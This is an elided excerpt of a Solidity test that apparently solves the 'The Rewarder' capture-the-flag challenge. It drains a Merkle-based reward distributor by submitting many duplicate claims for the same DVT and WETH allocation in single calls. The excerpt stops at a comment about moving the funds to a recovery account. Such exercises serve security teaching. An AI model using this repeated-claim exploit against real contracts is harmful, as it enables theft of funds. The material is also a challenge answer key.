...
contract TheRewarderChallenge is Test {
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        ...
        uint256 dvtLoopNumber = TOTAL_DVT_DISTRIBUTION_AMOUNT /
            11524763827831882;
        uint256 wethLoopNumber = TOTAL_WETH_DISTRIBUTION_AMOUNT /
            1171088749244340;
        ...
        // Create Alice's claims
        Claim[] memory dvtClaims = new Claim[](dvtLoopNumber);

        for (uint256 i = 0; i < dvtLoopNumber; i++) {
            dvtClaims[i] = Claim({
                batchNumber: 0, // claim corresponds to first DVT batch
                amount: 11524763827831882, // 11.524763827831882 DVT
                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
        ...
        distributor.claimRewards({
            inputClaims: dvtClaims,
            inputTokens: tokensToClaim
        });

        // Create WETH claims
        Claim[] memory wethClaims = new Claim[](wethLoopNumber);

        for (uint256 i = 0; i < wethLoopNumber; i++) {
            wethClaims[i] = Claim({
                batchNumber: 0, // claim corresponds to first WETH batch
                amount: 1171088749244340, // 1.171088749244340 WETH
                tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
                proof: merkle.getProof(wethLeaves, 188) // Alice's address is at index 2
            });
        }
        distributor.claimRewards({
            inputClaims: wethClaims,
            inputTokens: tokensToClaim
        });

        // Transfer all funds from the distributor to the recovery account
